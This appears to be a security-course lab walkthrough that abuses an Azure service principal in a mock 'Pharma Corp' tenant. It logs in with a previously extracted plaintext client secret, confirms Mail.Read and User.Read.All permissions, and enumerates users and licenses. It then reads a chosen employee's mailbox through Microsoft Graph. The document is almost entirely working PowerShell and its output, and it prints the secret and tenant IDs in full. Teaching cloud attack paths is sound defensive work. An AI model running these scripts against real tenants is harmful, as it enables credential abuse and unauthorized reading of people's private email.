# Attack Lab 12

```
− Login to the Pharma Corp tenant as ‘mailapp’ by using the credentials added earlier.
− Check the current API Permissions assigned to the service principal.
− Read the email content of MarieWilliams@pharmacorphq.onmicrosoft.com.
```

Validate the previous lab extracted credentials:
source code
```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
```
output
```
PS C:\Users\studentuser107> Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd

WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 
```
With the current logged user extract and enumerate roleassigment:

```
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Params = @{
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/appRoleAssignments"
"Method" = "GET"
"Headers" = @{
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}
$RoleAssignments = Invoke-RestMethod @Params -UseBasicParsing
$RoleAssignments.value
```
execution output:

```
PS C:\Users\studentuser107> $Params = @{
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/appRoleAssignments"
"Method" = "GET"
"Headers" = @{
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}

PS C:\Users\studentuser107> $RoleAssignments = Invoke-RestMethod @Params -UseBasicParsing

PS C:\Users\studentuser107> $RoleAssignments.value


id                   : AJyaShe_2EO0N_6BRMjfFS3Mt2NL-w5JqNFAw2e_2Cg
deletedDateTime      : 
appRoleId            : df021288-bdef-4463-88db-98f22de89214
createdDateTime      : 2022-06-20T11:06:13.5594346Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978

id                   : AJyaShe_2EO0N_6BRMjfFbksvwwU2tFCv0Ch_bDHaJ8
deletedDateTime      : 
appRoleId            : 810c84a8-4a9e-49e6-bf7d-12d183f40d01
createdDateTime      : 2022-06-20T11:06:13.7469384Z
principalDisplayName : mailapp
principalId          : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
principalType        : ServicePrincipal
resourceDisplayName  : Microsoft Graph
resourceId           : c44d6d94-e2cc-4f30-a0d0-2e37682b2978

```
Validate permissions reference from Microsoft azure documentaiton:
```
https://learn.microsoft.com/en-us/graph/permissions-reference#all-permissions-and-ids

Mail.Read	Application	810c84a8-4a9e-49e6-bf7d-12d183f40d01
User.Read.All	Application	df021288-bdef-4463-88db-98f22de89214
```
It's means that the current application could read every users and mails .

The following script could be used for enumerate users and License, using graph Microsoft API:
```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
#$URL = "https://graph.microsoft.com/v1.0/users?`$filter=startswith(displayName,'M')`&$orderby=displayName&`$count=true&`$top=1"
$URL = "https://graph.microsoft.com/v1.0/users?`$count=true&`$top=350"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$Users = Invoke-RestMethod @Params -UseBasicParsing
foreach($User in $Users.value)
{
    $UserID = $User.id
    $URL = "https://graph.microsoft.com/v1.0/users/$UserID/licenseDetails"
    $Params = @{
        "URI"= $URL
        "Method" = "GET"
        "Headers" = @{
            "Content-Type" = "application/json"
            "Authorization" = "Bearer $GraphToken"
        }
    }
    $LicenseDetails = Invoke-RestMethod @Params -UseBasicParsing
    If($LicenseDetails.value -ne "" -and $LicenseDetails.value -ne $null){
        [PSCustomObject]@{
            ID = $User.id
            DisplayName = $User.displayName
            UserPrincipalName = $User.userPrincipalName
            LicenseType = $LicenseDetails.value.skuPartNumber
        }
    }
}
```
The execution output:
```
C:\AzAppsec\Abuse_read_permissions_users.ps1
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 

ID                : 0505af70-fea0-4dc9-8a8e-89cb1d0a16c5
DisplayName       : Marie R Williams
UserPrincipalName : MarieWilliams@pharmacorphq.onmicrosoft.com
LicenseType       : O365_BUSINESS_ESSENTIALS
```

The target user is Marie R williams.

The source code for abuse permissions and read emails:
```
# Enumerate emails for an especific target user : 0505af70-fea0-4dc9-8a8e-89cb1d0a16c5 
# ID                : 0505af70-fea0-4dc9-8a8e-89cb1d0a16c5
# DisplayName       : Marie R Williams
# UserPrincipalName : MarieWilliams@pharmacorphq.onmicrosoft.com
# LicenseType       : O365_BUSINESS_ESSENTIALS

Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URL = "https://graph.microsoft.com/v1.0/users/0505af70-fea0-4dc9-8a8e-89cb1d0a16c5/messages"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$emails = Invoke-RestMethod @Params -UseBasicParsing
$emails.value
$emails.value | select -ExpandProperty body | select -ExpandProperty content
```
The script output:

```
PS C:\Users\studentuser107> C:\AzAppsec\Enumerate_emails_graph_API.ps1
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 

@odata.etag                : W/"CQAAABYAAABuOv53PmzjQYRYobfzvCWVAACSV8n8"
id                         : AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQBGAAAAAABHsGgwJaTUTpY7VKQoPhO0BwBuOv53PmzjQYRYobfzvCWVAAAAAAEMAABuOv
                             53PmzjQYRYobfzvCWVAACSZsmMAAA=
createdDateTime            : 2023-01-30T11:24:24Z
lastModifiedDateTime       : 2023-01-30T11:24:27Z
changeKey                  : CQAAABYAAABuOv53PmzjQYRYobfzvCWVAACSV8n8
categories                 : {}
receivedDateTime           : 2023-01-30T11:24:25Z
sentDateTime               : 2023-01-30T11:24:22Z
hasAttachments             : False
internetMessageId          : <SG2PR06MB2937ADCCED30BF9B9400DB10FBD39@SG2PR06MB2937.apcprd06.prod.outlook.com>
subject                    : Your documents are approved - Please do not reply
bodyPreview                : Dear Marie,
                             
                             Your documents are uploaded and approved. You can find the documents here - 
                             https://billingprocessorstg.blob.core.windows.net/mariewilliams
                             
                             In case of any changes, please upload the documents again and submit a new request.
                             
                             
                             Regards,
importance                 : normal
parentFolderId             : AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQAuAAAAAABHsGgwJaTUTpY7VKQoPhO0AQBuOv53PmzjQYRYobfzvCWVAAAAAAEMAAA=
conversationId             : AAQkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQAQABqq0b4q6I5LrujjLTM3P4A=
conversationIndex          : AQHZNJy2GqrRvirojkuu6OMtMzc/gA==
isDeliveryReceiptRequested : False
isReadReceiptRequested     : False
isRead                     : False
isDraft                    : False
webLink                    : https://outlook.office365.com/owa/?ItemID=AAMkADVhNjFkYWE4LTIxYjUtNDQzNi04MzI5LTVhMzg2ZjY1YTY3OQBGAAAAAABHsGgwJaTUTpY7VKQo
                             PhO0BwBuOv53PmzjQYRYobfzvCWVAAAAAAEMAABuOv53PmzjQYRYobfzvCWVAACSZsmMAAA%3D&exvsurl=1&viewmodel=ReadMessageItem
inferenceClassification    : focused
body                       : @{contentType=text; content=Dear Marie,
                             
                             Your documents are uploaded and approved. You can find the documents here - 
                             https://billingprocessorstg.blob.core.windows.net/mariewilliams
                             
                             In case of any changes, please upload the documents again and submit a new request.
                             
                             
                             Regards,
                             }
sender                     : @{emailAddress=}
from                       : @{emailAddress=}
toRecipients               : {@{emailAddress=}}
ccRecipients               : {}
bccRecipients              : {}
replyTo                    : {}
flag                       : @{flagStatus=notFlagged}

Dear Marie,

Your documents are uploaded and approved. You can find the documents here - https://billingprocessorstg.blob.core.windows.net/mariewilliams

In case of any changes, please upload the documents again and submit a new request.


Regards,
```
